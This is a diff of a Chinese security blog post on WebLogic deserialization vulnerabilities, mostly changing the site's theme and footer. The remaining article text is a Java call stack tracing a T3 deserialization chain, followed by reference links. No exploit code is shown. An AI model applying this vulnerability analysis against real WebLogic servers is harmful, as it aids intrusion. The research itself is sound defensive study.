+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">readObject:331, AnnotationInvocationHandler (sun.reflect.annotation)<br>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)<br>invoke:57, NativeMethodAccessorImpl (sun.reflect)<br>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:601, Method (java.lang.reflect)<br>invokeReadObject:1004, ObjectStreamClass (java.io)<br>readSerialData:1891, ObjectInputStream (java.io)<br>readOrdinaryObject:1796, ObjectInputStream (java.io)<br>readObject0:1348, ObjectInputStream (java.io)<br>readObject:370, ObjectInputStream (java.io)<br>readResolve:58, MarshalledObject (weblogic.corba.utils)<br>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)<br>invoke:57, NativeMethodAccessorImpl (sun.reflect)<br>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:601, Method (java.lang.reflect)<br>invokeReadResolve:1091, ObjectStreamClass (java.io)<br>readOrdinaryObject:1805, ObjectInputStream (java.io)<br>readObject0:1348, ObjectInputStream (java.io)<br>readObject:370, ObjectInputStream (java.io)<br>readObject:66, InboundMsgAbbrev (weblogic.rjvm)<br></code></pre></td></tr></table></figure>
 </li>
 </ul>
 <h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704</a></p>
@@ -315,143 +144,20 @@
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10173">https://xz.aliyun.com/t/10173</a></p>
 <p><a target="_blank" rel="noopener" href="https://y4er.com/posts/weblogic-cve-2016-0638/#exp%E5%88%86%E6%9E%90">https://y4er.com/posts/weblogic-cve-2016-0638/#exp%E5%88%86%E6%9E%90</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224593">https://www.anquanke.com/post/id/224593</a></p>
-
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">XMLDecoder反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">T3协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-number">3.</span> <span class="toc-text">配置调试环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2015-4582"><span class="toc-number">4.</span> <span class="toc-text">CVE-2015-4582</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-number">5.</span> <span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-number">6.</span> <span class="toc-text">CVE-2016-3510</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/11/29/weblogic/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&text=初识weblogic"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&is_video=false&description=初识weblogic"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=初识weblogic&body=Check out this article: https://racerz-fighting.github.io/2022/11/29/weblogic/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&name=初识weblogic&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/11/29/weblogic/&t=初识weblogic"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2016-2023
-    RacerZ
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
- 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Umami Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-</body>
-</html>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/11/29/ctfshow-%E6%A1%86%E6%9E%B6%E5%A4%8D%E7%8E%B0/">← Next CTFSHOW-框架复现</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/11/25/CC%E4%B8%8Etabby/">CC与tabby Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">XMLDecoder反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">T3协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-number">3.</span> <span class="toc-text">配置调试环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2015-4582"><span class="toc-number">4.</span> <span class="toc-text">CVE-2015-4582</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-number">5.</span> <span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-number">6.</span> <span class="toc-text">CVE-2016-3510</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
